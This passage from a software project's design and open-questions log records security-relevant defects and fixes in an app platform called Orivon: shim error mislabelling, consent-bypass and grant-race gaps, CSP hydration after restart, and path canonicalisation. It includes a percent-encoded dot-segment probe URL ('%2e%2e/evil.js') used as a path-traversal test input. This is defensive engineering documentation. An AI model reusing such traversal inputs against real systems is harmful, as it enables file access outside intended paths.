to be -- a main-world script alongside `main-world-socket.ts`'s own `contextBridge.
executeInMainWorld` dance is the natural fit, since that is already the mechanism that runs code
in the app page's own global scope rather than the preload's isolated one.

**Still open, needs an owner/shim-stream decision:** exactly where this call belongs, and whether
`reportError` should feed the same channel a real uncaught exception in an app tab would.

**Needed by:** before any real app whose dependency graph touches `stream` (or anything shimmed
on top of it) is expected to load successfully.

> **Resolved 2026-09-13, S4-X-shimfix.** The call site this entry asked for:
> `src/preload/expose-shim-globals.ts`'s `exposeShimGlobals()`, called from both `src/preload/
> app.ts` and `src/preload/newtab.ts`'s fallback branch, right alongside `exposeFetchRoute()`.
> It calls `installGlobals` (now `(options, target?)` -- `target` moved to a trailing, defaulted
> parameter, matching `installOrivon`'s own pattern, so a production caller can hand
> `contextBridge.executeInMainWorld` the bare function and let the default resolve to that
> call's own real main-world `window`) via the exact `executeInMainWorld` mechanism this entry's
> own AI recommendation named as "the natural fit."
>
> **Gated on the identical `--orivon-app-tab` flag `fetch-route.ts` already reads**
> (`src/main/tab-view.ts`'s `appTabArgsFor`) -- CLAUDE.md's own instruction on this exact defect
> is that shimmed Node globals must never reach an ordinary browsing tab. `window.orivon` itself
> is exposed to every tab regardless (an ungranted caller only ever sees denials through it),
> but `process`/`stream` are ambient globals a plain page's own script could stumble into --
> already a wider surface, so it gets the narrower gate.
>
> **Proven end to end, not just at the unit level** (the whole reason this was invisible to 3993
> unit tests to begin with): `test/app-loader-journey-shim-entry.ts`'s own `installGlobals()`
> workaround call is gone, and `test/e2e-app-loader-journey.test.ts` now registers its fixture's
> origin (via `src/main/dev-grant.ts`'s hook, with an empty pattern list -- "an empty grant
> answers exactly like no grant at all," `src/broker/net-capability.ts`'s own `connect()`)
> BEFORE navigating, so the fixture's tab is flagged for its very first load exactly like a real
> registered app's tab would be, then asserts `window.process` is installed before exercising
> the shim at all. See that test's own new checks for the real-launch evidence.

---

### A152 -- the shim's `toNodeError` cannot recognise a real cross-world `orivon.net.connect()` denial, and reports every one as a generic `internal` code **[RESOLVED 2026-09-13 -- S4-X-shimfix]**

**Raised 2026-09-13**, `S4-7-e2e` lane, same test as A151. Measured, not reasoned: a real page's
`window.orivon.net.connect()` call, denied for want of a grant, rejects with a value that is
`{name: "OrivonError", message: "tcp.connect is not granted to this origin", code: "denied"}` --
structurally exactly right, and exactly what `test/e2e-capability-boundary.test.ts`'s own Phase 1
already asserts against the raw capability API. But a diagnostic added to this lane's test (`e instanceof
Error`, `Object.getPrototypeOf(e)`, `e.constructor.name`) showed that value is a **plain object**
(`constructor.name === 'Object'`, prototype is `Object.prototype`) once it has crossed back from
the main world (where `main-world-socket.ts`'s bridge runs, per `A113`'s own account of that path
constructing a real `OrivonError`) to the page's own promise rejection -- never a real `Error`
instance, despite carrying every field of one correctly as an own, enumerable property.

**Where this actually breaks.** `src/shim/node-http-errors.ts`'s `isOrivonError` is `value
instanceof Error && typeof value.code === 'string'` -- the `instanceof Error` half is false for
EVERY real denial that crosses this specific boundary, so `toNodeError`'s fallback branch always
fires instead: `code`/`orivonCode` become the generic `'internal'`, and the message becomes
`String(value)` -- literally the string `"[object Object]"`, since a plain object has no useful
`toString()`. `src/shim/node-net-socket.ts`'s `Socket` class calls `toNodeError` on every
`dial()` rejection, so this fires for every real net-shim denial in a real Electron launch, not a
contrived case -- `test/e2e-app-loader-journey.test.ts`'s two refusal checks pin this exact,
current value (`orivonCode === 'internal'`) rather than the intended `'denied'`, specifically so
a fix here is a visible, deliberate test change rather than a silent behaviour shift nobody
notices.

**This is a fidelity/observability bug, not a security hole.** The connection is still correctly
refused either way -- confirmed by this lane's own out-of-manifest check, which fails loudly the
moment the connection resolves instead of rejecting, independent of which code the rejection
carries. What breaks is a real ported Node app's ability to branch on `err.code === 'denied'`
(or any other real `OrivonErrorCode`) through this shim -- exactly the kind of silent capability-
adjacent behaviour change `docs/development/testing.md`'s own testing philosophy is about, just
one layer higher than a broker regression: not "the wrong thing is allowed," but "the right
refusal is mislabelled to the app that has to react to it."

**AI recommendation:** `isOrivonError` should recognise this shape structurally --
`typeof value === 'object' && value !== null && typeof (value as {code?: unknown}).code ===
'string' && typeof (value as {message?: unknown}).message === 'string'` -- rather than requiring
`instanceof Error`, mirroring how `src/broker/errors.ts`'s own `isOrivonErrorLike` already
tolerates a duck-typed shape one layer down (`A39` recorded that same class of two-checks-
disagree gap once already). Not implemented here: `src/shim/` is outside this lane's owned path
tonight, and the right fix might instead belong one layer up, wherever the main-world bridge's
rejection is actually produced, if the goal is a real `Error` instance surviving the crossing
rather than a shim-side workaround for a value that never was one.

**Needed by:** before any real ported app is expected to distinguish a capability denial from any
other failure through `require('net')`/`require('http')`/`require('https')`.

> **Resolved 2026-09-13, S4-X-shimfix. Both layers this entry named, not one or the other.**
>
> **Producer (`src/preload/main-world-socket.ts`):** every `bridge.*` call `installOrivon`
> makes -- not only `netConnect`, every one that can reject with something the isolated world
> built via `../orivon-error.ts`'s own plain-object `toOrivonError` -- is now wrapped in a new
> local `callRevived`, which rebuilds a real `Error` from any rejection shaped like one of ours
> before the page ever sees it. This is the correctness fix: `OrivonError extends Error`
> (`src/contracts/errors.ts`) is a promise made to every `orivon.*` consumer, not only the Node
> shim, and a page calling `orivon.net.connect()` directly now gets a real `Error` too. The
> file's own LOCAL `toOrivonError` (used for stream errors and `readFileSync`'s throw) was
> ALSO upgraded to build a real `Error` rather than a plain object -- it never needed to survive
> a second crossing (everything it feeds is already past one), so nothing was lost by fixing it
> alongside the entry that was actually measured.
>
> **Consumer (`src/shim/node-http-errors.ts`):** kept, as defence in depth, not dropped once the
> producer fix landed. `isOrivonError` is now structural (`name`/`message`/`code` all present and
> typed right) rather than `instanceof Error`, exactly as this entry's own AI recommendation
> said -- but with the closed-enum check this entry's recommendation did NOT include: `code`
> must be one of the eleven real `OrivonErrorCode` values (a set duplicated from
> `src/broker/errors.ts`'s own, the same duplication that file's `ORIVON_ERROR_CODES` already
> accepts, since `src/shim/` may not import `src/broker/` and `contracts/errors.ts` emits no
> runtime code to import instead). A value shaped like an `OrivonError` but carrying an
> unrecognised code still fails closed to `internal` -- the "attacker-influenced value" concern
> this entry raised is answered by that check, not by requiring `instanceof Error` again.
>
> **Why both, when the producer fix alone would have closed the specific measured case:** the
> producer fix only reaches values that cross through `installOrivon`'s own `bridge.*` calls. A
> future boundary this lane did not touch (or `exposeFallback`'s own path -- see this entry's own
> A113 note below) could still hand the shim something OrivonError-shaped but not
> `instanceof Error`; the consumer fix means that shim keeps reporting the right code instead of
> silently regressing to `internal` again.
>
> **Proven end to end**: `test/e2e-app-loader-journey.test.ts`'s two refusal checks, which used
> to pin `orivonCode === 'internal'` deliberately (so a fix here would be a visible, intended test
> change, not a silent behaviour shift), now pin `orivonCode === 'denied'` and pass against a
> real Electron launch -- see this PR's own verification output for the actual before/after
> values from that launch, not just the unit tests added alongside (`src/shim/tests/
> node-http-errors.test.ts`, `src/preload/tests/main-world-socket.test.ts`).
>
> **A113 (`docs/open-questions.md`), the same family, explicitly NOT touched by this fix, and
> not narrowed by it either.** A113 is about `orivon-surface.ts`'s `exposeFallback()` path --
> taken only when `contextBridge.executeInMainWorld` is absent or throws, so `installOrivon`
> never runs at all on that path, and neither `callRevived` nor the local `toOrivonError` this
> entry fixed ever sees anything on it. On that path a thrown `OrivonError` loses its `.code`
> entirely (not merely its `instanceof Error`-ness) when `contextBridge` flattens it crossing the
> isolated world -- a stricter loss than A152's, and the structural `isOrivonError` fix does
> nothing for a value with no `.code` at all. A113 remains fully open, exactly as it was found.

---

### A154 -- `isValidCanonicalPath`'s doc comment overclaimed a property that only held on two of its three call paths **[RESOLVED 2026-09-14 -- ADV-fix2]**

**Raised 2026-09-14**, adversarial review of the `step-4-app-loader` landing, confirmed
independently before this lane started. `isValidCanonicalPath`'s own comment stated its
re-derivation check "subsumes the '.'/'..' segment rule below, which URL normalisation
collapses" -- true only when the function receives a RAW PATH STRING, which is what
`bundle-hash.ts`, `pin.ts` and `manifest.ts`'s `validateRelativePath` all hand it.
`canonicalAssetPath` does not: it calls `new URL(assetUrl)` on the FULL url first, and the
WHATWG parser collapses a dot segment -- including its percent-encoded spelling -- while
building `pathname`, before `isValidCanonicalPath` ever runs. Measured: `new
URL('https://probe.example/%2e%2e/evil.js').pathname === '/evil.js'`, and the same for a
two-level `.../%2e%2e/%2e%2e/...` case.

**Not an exploit, and the reviewer said so plainly.** `fetch-bundle.ts`'s asset loop is
protected upstream -- `manifest.ts`'s `validateRelativePath` already rejects a dot segment (or
its percent-encoded spelling) in a manifest-declared `entry`/`assets` string before it is ever
joined into a URL, per-segment, for exactly this reason (see that function's own comment on why
it will not join a whole path through a base either -- the identical hazard, hit first, one call
site over). `serve.ts`'s live-request path is protected downstream by `isPinnedPath`'s
exact-string allowlist: a laundered path can only ever match an ALREADY-pinned asset the app
itself shipped, never an arbitrary file. The defect was a false claim in a security-relevant
comment, untested on the one call shape where it does not hold, in a function whose whole job is
path safety -- not a live vulnerability.

**Fixed 2026-09-14, ADV-fix2.** Chose to make the property actually true rather than only
correct the comment, because the fix was cheap and this codebase already has a fix of the exact
same shape one call site over (`manifest.ts`'s `validateRelativePath`, above) -- rejecting a dot
segment before a whole-string URL join can launder it. `canonicalAssetPath` now rejects
outright, before trusting `parsed.pathname`, if the RAW `assetUrl` string's path (found without
parsing the authority: an unescaped `/` cannot occur in an http(s) authority, so the first `/`
after `://` always starts the path) carries a segment that percent-decodes to `.` or `..`.
`isValidCanonicalPath`'s own comment was also corrected to say precisely where the subsumption
holds (a raw-path caller) and where it does not (reached via `canonicalAssetPath`, where a dot
segment is now caught earlier, by that new check, not by anything in this function).

**Verified:** `src/broker/policy/tests/canonical-path.test.ts` gained five cases exercising the
one shape no existing test reached -- a full URL carrying a literal or percent-encoded dot
segment (both hex cases), plus two guard-against-over-correction cases (a segment that merely
starts with dots; a dot segment appearing only in the query string, which must not be rejected).
All five fail against the pre-fix code and pass after. Full suite: `npm test` unchanged in count
elsewhere, 38/38 in the touched file, 1900/1900 across `src/broker/policy/` and `src/loader/`.

---

### A155 -- nothing verified that `electronFetch` still delegates to a call carrying `redirect: 'error'` **[RESOLVED 2026-09-14 -- ADV-fix2]**

**Raised 2026-09-14**, same adversarial review as A154, confirmed independently. A141's fix
(above) made `redirect: 'error'` the ONLY thing keeping `fetch-bundle.ts`'s same-origin and
canonical-path checks honest -- that entry's own resolution block says the remaining checks are
"provably tautological" -- and the requirement lives in a doc comment on `netFetch`, not in the
type system. `test/e2e-loader-adapter.test.ts`'s "THE LOAD-BEARING PROOF" (its own words) drives
`netFetch` directly, never `electronFetch`; the only place that suite calls `electronFetch`
asserts its address guard REFUSES a real loopback server, which returns before `netFetch` is
ever reached. So no test anywhere exercised `electronFetch`'s delegation to `netFetch` on the
path where the guard actually PASSES -- a future edit that wrapped, inlined, or re-implemented
that call, dropping `redirect: 'error'` in the process, would have passed every existing test,
including the one whose stated purpose is to prove this exact guarantee.

**Why a hermetic version of "drive a real redirect through `electronFetch` itself" was
considered and rejected**, rather than merely not attempted: `electronFetch` takes no injectable
resolver -- it calls Electron's own `net.resolveHost` directly, and re-checks
`isPublicUnicast(endpoint.address)` on the RESOLVED address, not just the hostname text. Mapping
a nice-looking hostname to a local server via `--host-resolver-rules` does not help: the guard's
post-resolution check would see the resolved address is loopback and refuse regardless -- that
refusal is T12/A46 working exactly as designed, already the reason
`test/e2e-loader-adapter.test.ts`'s own "Not a full end-to-end `fetchBundle()` success test, and
not by oversight" paragraph gives for why that suite stops where it does (`src/loader/README.md`
Design notes). No genuinely public, routable HTTPS endpoint exists for this repo's test suite to
target, so a real redirect through `electronFetch`'s own guard is not reachable hermetically.

**Fixed 2026-09-14, ADV-fix2**, by closing the seam at the boundary that actually matters
instead: a new `src/loader/tests/electron-fetch.test.ts`, mocking `electron`'s `net.fetch`/
`net.resolveHost` (the same pattern `src/main/tests/favicon.test.ts` already uses for the same
reason), asserting the EXACT arguments `net.fetch` receives -- both through `netFetch` directly
and through `electronFetch` once its guard passes, on both of the guard's two branches (a public
address literal; a hostname that resolves to only public addresses). This is deliberately an
assertion on `net.fetch`'s own call arguments, not on whether `netFetch` was called as a named
function -- insensitive to a future inlining or rename, sensitive to the one thing that must
never silently drop. Three more cases cover the guard's failure path on both branches (a private
literal, a hostname resolving to a private address, a hostname resolving to no addresses),
asserting `net.fetch` is never called.

**Proven to actually catch the regression it exists for, not merely asserted to.** Verified by
deliberately breaking `netFetch` two different ways and confirming the new suite fails each time,
then restoring the original file unchanged (`git diff` empty afterward): dropping `redirect:
'error'` from the options object failed the three delegation-asserting tests with a clear diff
naming the missing key; replacing the call with `net.request(...)` entirely failed the same three
tests with `TypeError: net.request is not a function`. Both times, the three guard-failure tests
kept passing, confirming they exercise a genuinely different code path rather than coincidentally
passing alongside a broken one.

**Not touched:** `src/loader/electron-fetch.ts` itself, `test/e2e-loader-adapter.test.ts`, and
`test/loader-adapter-entry.ts` -- this was a coverage gap, not a code defect, and the e2e suite's
own real-Electron, real-redirecting-server proof of `redirect: 'error'` stays exactly as
valuable as it already was for the one thing only a real process can prove (a real
`net.fetch`/`Duplex` rejection on a real redirect). The new unit suite is a structural backstop
underneath it, not a replacement for it.

### A153 -- a grant could be committed against a manifest the consent dialog never actually reviewed **[RESOLVED 2026-09-14 -- stream/main-11-grant-revalidation]**

**Raised 2026-09-14**, `ADV-fix` lane, an adversarial review of the step-4 app-loader landing,
confirmed by the conductor reading `src/main/request-grant.ts` directly.

**The gap.** `requestGrant` fetched the manifest, ran `decideGrantRequest`, then awaited
`consent(...)` -- a real native dialog, up to 120 seconds (`A140`) -- and only then called
`broker.grant()`, using the decision computed BEFORE the dialog. Nothing re-checked the manifest
between computing that decision and committing it. Meanwhile `installFromHint`
(`./app-install.ts`) can re-register a narrower, or entirely different, manifest for the SAME
origin at any point -- a page can re-trigger its own `<link rel="orivon-manifest">` hint by
reloading itself (`src/preload/manifest-hint.ts`'s own "first hint wins per navigation" doc), and
`installFromHint` is serialised per origin via `withOriginQueue` while `requestGrant` was not. So
a grant dialog open against one manifest could commit after a different manifest was already in
force, and `GrantLedger.grant()` writes whatever patterns it is handed unconditionally -- the
manifest invariant (`docs/architecture/capability-api.md` design rule 4: "an app can never obtain
a capability absent from its manifest") was enforced only by the caller, only once, before the
dialog.

**Impact.** An origin could end up holding a grant wider than, or simply disagreeing with, its
currently-registered manifest, and every later surface that reads the manifest (the permissions
list, the update decision in `update.ts`) would disagree with the authority actually in force.

> **Resolved 2026-09-14, stream/main-11-grant-revalidation.** `requestGrant` re-reads the
> manifest and re-runs `decideGrantRequest` -- against the SAME patterns the person already saw
> and accepted (`decision.patterns`), never a freshly recomputed request -- immediately after
> `consent()` resolves and before `broker.grant()` runs. If the manifest in force right now no
> longer allows exactly what was approved, this fails closed: no grant, `requestGrant` resolves
> `false`. Proven with a test that fails before the fix:
> `src/main/tests/request-grant.test.ts`'s "re-reads the manifest after consent and fails closed
> if it no longer allows what was approved" swaps the manifest a stub `broker.app.manifest`
> returns between the pre-dialog read and the post-consent re-read.
>
> **`requestGrant` was deliberately NOT also serialised through `withOriginQueue`.**
> Re-validation alone already closes the security hole -- a grant can never commit against a
> stale manifest, full stop -- and a queue would only additionally change TIMING: two calls for
> one origin would no longer be allowed to overlap at all. The cost of that is concrete and worse
> for a real person: an app install triggered by a manifest hint (`installFromHint`, already
> wrapped in `withOriginQueue`) can itself show a dialog and wait up to 120 seconds, so queuing
> `requestGrant` behind it would make an unrelated grant request wait out someone else's decision
> before its own dialog even opens. AI recommendation, not an owner decision -- flagging in case
> the owner weighs the timing question differently once a real person's install/grant dialogs
> actually overlap.

### A156 -- accepting a capability-widening update revoked live handles for capabilities the update never touched **[RESOLVED 2026-09-14 -- stream/main-11-grant-revalidation]**

**Raised 2026-09-14**, `ADV-fix` lane, adversarial review, confirmed by the conductor reading
`src/main/update-outcomes.ts` and `src/broker/index.ts` directly.

**The gap.** `driveLoadResult`'s `needs-capability-prompt` branch called `grantDeclared`, which
looped over EVERY capability in `Object.keys(result.requestedPatterns)` -- the manifest's whole
declared set, not the delta the update actually asked for -- and called `broker.grant()` for
every one of them, unconditionally, once the person accepted. `broker.grant()`
(`src/broker/index.ts`) always mints a fresh `GrantId` and then `await handleTable.revoke(key,
replaced.id)`, tearing down every live handle under whatever grant it replaces. That cascade is
correct and deliberately tested for a REAL authority change (`A84`); it was never bounded to
capabilities that actually changed.

**Concrete result, in plain terms.** An app already holding `tcp.connect` with an open, streaming
socket ships an update that only adds `fs`. The person reads a dialog that names file access,
accepts it, and their live, completely unrelated socket is torn down with `'revoked'` -- something
they had no way to anticipate from what the dialog told them.

**Why the existing suite could not see it.** `update-outcomes.test.ts` stubbed `broker.grant`
entirely (never inspecting how many times, or for which capabilities, it fired), and every
capability-prompt test used a manifest declaring exactly one capability -- so "already-held,
unrelated, unchanged" was structurally never exercised.

> **Resolved 2026-09-14, stream/main-11-grant-revalidation.** Extracted `grantChangedCapabilities`
> (`src/main/grant-changed-capabilities.ts`, shared with A155's fix below) -- it reads the
> origin's currently-held grants first, and skips `broker.grant()` for any capability whose
> decided patterns are IDENTICAL (order-independent) to what is already held. A capability that
> is new, or whose pattern set genuinely narrowed or widened, is still granted -- and still
> triggers the teardown cascade, which is correct for those. Proven with three tests that fail
> before the fix, in `src/main/tests/update-outcomes.test.ts`: unchanged-and-held is skipped
> while a genuinely new capability in the same update still grants; the same two patterns in
> reversed order are not mistaken for a change; a genuinely narrowed pattern set still re-grants.

### A157 -- install-time consent could be permanently skipped via a second door to a grant **[PARTIALLY RESOLVED 2026-09-14 -- stream/main-11-grant-revalidation]**

**Raised 2026-09-14**, `ADV-fix` lane, adversarial review, confirmed by the conductor reading
`src/main/install-consent.ts` and `src/main/app-install.ts` directly.

**The gap.** `requestInstallConsent`'s "already asked" derivation (`A139`) skipped the WHOLE
all-or-nothing dialog -- for every capability the manifest declares, not just the ones already
held -- the moment the origin held a live grant for ANY declared capability:
`held.some((existing) => capabilities.includes(existing.capability))`. That is sound only if this
function is the sole door to a grant. It is not: `app.requestGrant` (`./request-grant.ts`) is a
second one, and `registerApp` runs BEFORE `requestInstallConsent` in `app-install.ts`'s own
`finishInstall` -- so a page already running (`A146`: install-time consent is asked after the
page's own scripts start) can call `app.requestGrant` for exactly ONE of its declared capabilities
in that window, and permanently suppress the dialog for every OTHER capability it ever declares.
The result: the app silently never receives the rest of what it asked for, the person is never
shown the dialog, and nothing on disk or in memory distinguishes that state from "never
installed" -- the same underlying gap `A145` already named for the declined-visit case, from a
different door.

> **Partially resolved 2026-09-14, stream/main-11-grant-revalidation.** The bound is now
> `capabilities.every(...)`, not `.some(...)` -- the dialog is skipped only once nothing declared
> is left unheld, so a single out-of-band grant for one capability no longer masks the rest. The
> final grant loop was also moved to the shared `grantChangedCapabilities` (`A154`), so an
> already-held, unchanged capability inside an otherwise-shown dialog is not re-granted either --
> reusing that fix rather than reintroducing its exact bug on this second call site. Proven with a
> test that fails before the fix: `src/main/tests/install-consent.test.ts`'s "A155: still prompts
> when only SOME declared capabilities are already held".
>
> **What this does NOT fix, and is parked rather than decided here.** `.every` is still an
> INFERENCE from held grants, not a record of "we asked, and here is the answer" -- the same
> honest gap `A145` already named for the decline case. It is the best narrowing available
> without adding new persisted state: closing it for real needs either a new persisted "consent
> decision" marker in `LedgerStorage` (touching every implementation of it, exactly the
> real-engineering option `A145` already declined to choose alone) or an owner decision that this
> residual inference is an acceptable floor. Not this lane's call -- parked alongside `A145` for
> whoever settles both at once, since they are now provably the same shape from two different
> doors.
>
> **Update 2026-09-14, lane `D-remember-no`: the decline half of this pairing is now closed
> (`A145`'s own resolution block, above), the accept half is deliberately NOT.** The owner's
> 2026-09-14 decision was specifically "remember that the person said no" -- it says nothing
> about persisting a separate "we asked, and they said yes" marker, and the grant ledger itself
> already IS that record for a real accept (a live, persisted `Grant` is stronger evidence of
> "asked and agreed" than any marker recording the question could be). So `.every(held...)`
> remains exactly the inference it was: sound whenever it is true (nothing declared is left
> unheld, by construction, regardless of which door filled it), but still not a record of
> `requestInstallConsent` itself having run. `LedgerStorage` now has the shape a persisted
> "consent decision" marker would need (`declined-capabilities.json`, `src/broker/grants/
> declined-consent.ts`), so extending it to the accept side is cheap IF the owner ever decides the
> residual inference is not an acceptable floor -- but that is a fresh decision, not implied by
> this one, and remains this entry's own open half.

### A158 -- a restored app's first document is served with a CSP narrower than its real grant, and cannot self-correct **[RESOLVED 2026-09-14 -- lane G-hydrate]**

**Raised 2026-09-14**, adversarial review of the whole S4-6/S4-7 landing (lane ADV-fix3),
verified directly against the real `GrantLedger`/`createBroker` mechanism rather than assumed.

**What a real person experiences.** Someone installs an app, grants it network access, and it
works. They quit Orivon and reopen it later. The app opens from its own local cache instantly
(that part is correct and offline-first, `ADR-0007`) -- but its network calls now fail as though
the grant never happened. Reloading the tab fixes it completely and permanently for the rest of
that session. Nothing in the UI says to reload, or that anything is wrong at all; the app just
looks broken until the person happens to refresh it.

**The mechanism, confirmed with a real ledger, not a stub.** `loaderSubsystem.afterReady` calls
`restorePinnedServing` before any window exists, registering `protocol.handle` for every pinned
origin. That handler closes over `grantedConnectPatternsFor`, which reads
`broker.app.grants(origin)` fresh on every request -- and `GrantLedger.grantsFor` returns `[]`
for an origin whose persisted grants have not yet been hydrated. Hydration only happens on the
first `registerApp` call for that origin (`grantsHydrated`'s own doc: re-validating a restored
grant needs a manifest), and `registerApp`'s only production callers run after a page has
already loaded and reported its manifest hint -- which cannot happen before that first document
is already served with whatever CSP `connectSrcFor` computes from an empty grant list.
`src/loader/tests/electron-serve.test.ts`'s new "restorePinnedServing across a restart" suite
proves both halves against a real `createBroker`/`GrantLedger`/`LedgerStorage`: the first
request truly is `'self'`-only despite a real persisted grant, and the SAME already-registered
handler correctly reflects the grant on its very next request once `registerApp` runs -- so "a
reload fixes it" is a verified property of the code, not an assumption.

**Why this is not fixed here, and why widening the fallback is the wrong direction.**
`grantedConnectPatternsFor` returning `[]` on anything short of a confirmed grant is deliberate
and correct (`connect-src.ts`'s own invariant: being wider than the real grant is the one
direction that is a security bug, never the narrower one). The three ways to close the gap
instead of just observing it were each considered and rejected or deferred:

1. **Hydrate at startup from a manifest read off local disk** (the loader's own pinned,
   hash-verified `MANIFEST_PATH` asset, already read by `createAppRequestHandler` for content
   resolution). Rejected: `A137` established that re-validating a restored grant against a
   manifest that is not independently, freshly obtained collapses the precondition for forging a
   grant from "control of the real origin's server" down to "local write access to this
   machine's profile directory" -- a real weakening, not merely an unproven one, regardless of
   the local copy's own hash-tree integrity (that hash tree only proves internal
   self-consistency of what is on disk, never that it reflects the real origin's current
   wishes). `A137`'s own conclusion is directly on point: a value read off disk must not be
   trusted more than the same value arriving fresh.
2. **Fetch a fresh manifest over the network at startup, before serving.** Rejected as
   architecturally wrong, not merely out of scope: `restorePinnedServing` exists specifically so
   a previously-installed app keeps working **offline**, across a restart
   (`src/loader/subsystem.ts`'s own header). Requiring a network round trip before the first
   document can be served correctly would trade a CSP correctness bug for breaking the offline
   guarantee outright.
3. **Hold the first navigation until install and consent settle, then load from cache.** This is
   exactly `A146`'s option 1, already filed as an owner-level UX decision (a page that visibly
   pauses before running vs. one that runs and might be corrected) rather than something an
   automated lane should decide. **`A146` and this entry are the same underlying architecture
   gap** -- the first document is delivered before the app's true state (consent, and here,
   grants) is settled -- so resolving `A146` in favour of holding the navigation would close this
   gap too, as a side effect, since `registerApp` would then run with a fresh manifest before any
   response is served. Whoever decides `A146` should see this entry.

**What this lane did instead.** `restorePinnedServing` now logs a diagnostic
(`console.warn`, naming the origin) whenever it restores serving for an origin that holds a
real, persisted capability grant not yet reflected in what it just served -- computed from
`isRegisteredSync`/`persistedAppsSync`, the exact pair `src/main/permissions.ts`'s settings list
already reads off disk for **display only**, never as live authority (`A137`), so this adds
nothing to what is actually served or authorised. It converts a silent degradation into a
detectable one (a support session or a developer reading the log can see it happening); it does
not tell the affected person anything, because no UI reads this signal yet. That is the honest
extent of what this lane closed -- see `src/loader/electron-serve.ts`'s `hasUnhydratedPersistedGrant`.

**AI recommendation, not an owner decision:** resolve this alongside `A146`, since fixing one all
but fixes the other, rather than building a second, narrower "reload this one tab" mechanism
just for grants.

**Update 2026-09-14, lane F-reach -- partially resolved, and the reasoning for why only partly is
the more important part.** `A143`'s own resolution made `src/loader/serve.ts`'s `fetchThirdParty`
a SECOND, independent, per-request LIVE gate for `https.connect` -- reading `broker.app.grants`
fresh and deciding with `checkConnectSecure`, exactly the function `orivon.net.connectSecure`
itself calls. That changes the answer to this entry's own framing question ("work out whether
[a live handler gate] changes what the header should be computed from at first load"): **once a
live handler independently re-checks every actual request, a header that is momentarily too
permissive grants nothing by itself** -- it only decides whether the browser attempts a request
the handler still, correctly, refuses if the grant was not real. So `img-src`/`font-src`/
`media-src` (this same PR's own new CSP directives, sourced from `https.connect`) now widen from
`persistedAppsSync`'s real, disk-persisted state during the narrow post-restart window, via
`electron-serve.ts`'s `secureHeaderPatternsFor` -- the same-shaped fallback this entry's own
"what this lane did instead" section already used for its diagnostic, now feeding the actual
header rather than only a log line.

**`connect-src` (`tcp.connect`) deliberately keeps the OLD, strict, no-fallback behaviour --
this is not an oversight, and applying the same widening there was considered and rejected
mid-lane, after nearly shipping it.** `connect-src` is not only backed by a live handler:
`docs/open-questions.md` A42 already established it is "the ONLY thing standing between an app's
page and a live `WebSocket`" connection, and `ws:`/`wss:` is a scheme `registerAppOrigin` never
registers a `protocol.handle` for -- so a `wss://` attempt never reaches `fetchThirdParty` or any
other live re-check at all. Widening `connect-src` from a persisted-but-not-yet-re-validated grant
would therefore widen a REAL authorisation for that one request type, exactly the mistake `A137`
forbids -- the reasoning that makes the `https.connect` fallback above safe (a live handler
underneath re-checks every actual request) simply does not hold for `WebSocket`. See
`src/loader/electron-serve.ts`'s `grantedConnectPatternsFor` and `secureHeaderPatternsFor`, whose
doc comments now cross-reference this distinction directly, and the two tests in
`electron-serve.test.ts` proving each side (`'A158 STILL OPEN FOR connect-src'` /
`'A158 RESOLVED FOR THE HEADER'`).

**So, precisely, as of lane F-reach:** RESOLVED for `img-src`/`font-src`/`media-src` (the two new
directives that PR introduces). STILL OPEN for `connect-src` -- a restored app's `fetch`/XHR/
`WebSocket` reach still showed `'self'`-only until this origin's manifest hint landed.

> **RESOLVED, for every directive, 2026-09-14, lane `G-hydrate` -- owner decision.** The remaining
> `connect-src` gap above was never a flaw in `grantedConnectPatternsFor`'s own refusal to widen
> from disk -- that refusal was correct, and stays. What changed is WHICH manifest hydration reads
> from, and the owner supplied the insight that makes an EARLIER read safe: *"changing the manifest
> changes also the hash, so a change on manifest is enough to re-start the status of permissions,
> the same a new added/modified file would."* The manifest lives at `/.well-known/orivon.json`
> **inside the pinned bundle**, as a leaf of `ADR-0009`'s hash tree, and `serve-verify.ts`'s
> `verifyPinnedTree` recomputes that whole tree against `pin.bundleHash` before ANY byte of the
> bundle is servable. So the manifest on disk is not "a saved value" in the sense `A137` ruled
> out -- it is cryptographically tied to the exact bundle a person already consented to, and
> reading it costs nothing beyond what `createAppRequestHandler` was already going to pay to
> verify that same bundle before serving it at all.
>
> **Why this genuinely dissolves `A137`'s objection, and where the boundary actually sits.**
> `A137`'s withdrawn attempt hydrated from a manifest persisted BARE, for hydration's own sake,
> with no cryptographic tie to anything else -- an attacker with local write access to the profile
> directory could plant a self-consistent `(manifest.json, grants.json)` pair for an origin they
> chose, at the cost of nothing but two flat JSON files. This mechanism reuses the SAME artefact
> that already gates whether ANY code for that origin runs at all: forging a pinned manifest now
> means forging a whole pin record plus a bundle whose hash matches it -- which is not a new attack
> surface this lane adds, it is `verifyPinnedTree`'s EXISTING security boundary for cached serving,
> already relied on by every app on this machine. An attacker able to defeat that boundary could
> already serve themselves arbitrary code offline forever under a chosen origin; hydrating grants
> from the same already-verified artefact adds nothing to what such an attacker could already do.
> `A137`'s rule -- a value read off disk must never gain authority a fresh request would not have --
> is honoured, not overridden: what changed is that this ONE value is no longer merely "read off
> disk" in the sense that rule was written to forbid.
>
> **The mechanism.** `GrantLedger.hydrateFromPinnedManifest` (`src/broker/grants/grant-ledger.ts`)
> runs the SAME `hydrateGrants` re-validation `registerApp` itself performs, callable independently
> of it, gated on the SAME `grantsHydrated` flag so it is a no-op once the real `registerApp` has
> already spoken. `src/loader/serve.ts`'s `verifiedManifestFor` shares its whole-tree verification
> with `createAppRequestHandler` (one `resolveVerifiedBundle` helper, not two copies) and answers
> `undefined` for anything short of a fully re-verified pin. `electron-serve.ts`'s
> `registerServingFor` calls both, in that order, BEFORE `registerAppOrigin` ever wires a handler
> onto the session -- so there is no window in which a request could reach a handler whose grants
> are not already live. **The later, freshly fetched manifest stays fully authoritative**:
> `registerApp`'s own hydration branch now clears whatever this seeded before re-deriving the set
> from the fresh manifest (`record.grants.clear()`), so a capability the fresh manifest narrows or
> drops is narrowed or dropped exactly as if nothing had been hydrated early -- `decideGrantRequest`
> is unconditional and all-or-nothing either way (a persisted grant whose pattern set is not fully
> covered by the manifest in force is refused entirely, not narrowed to the covered subset -- a
> pre-existing rule, unchanged by this lane).
>
> **What this closes, concretely.** `liveGrantedPatternsFor` (`electron-serve.ts`, the function
> `grantedConnectPatternsFor`/`secureHeaderPatternsFor` now both delegate to -- Rule 3, one
> implementation) reads `broker.app.grants` directly, with no disk-fallback special case for
> either header any more: by the time either can be called, the ledger already holds the truth.
> `authoriseReachFor`'s live gate for a real third-party `https.connect` request, and any live
> capability call an app's own page makes (`orivon.net.connect`/`connectSecure`, reading the SAME
> `ledger.currentGrant`), see the identical, already-hydrated answer. Proven end to end in
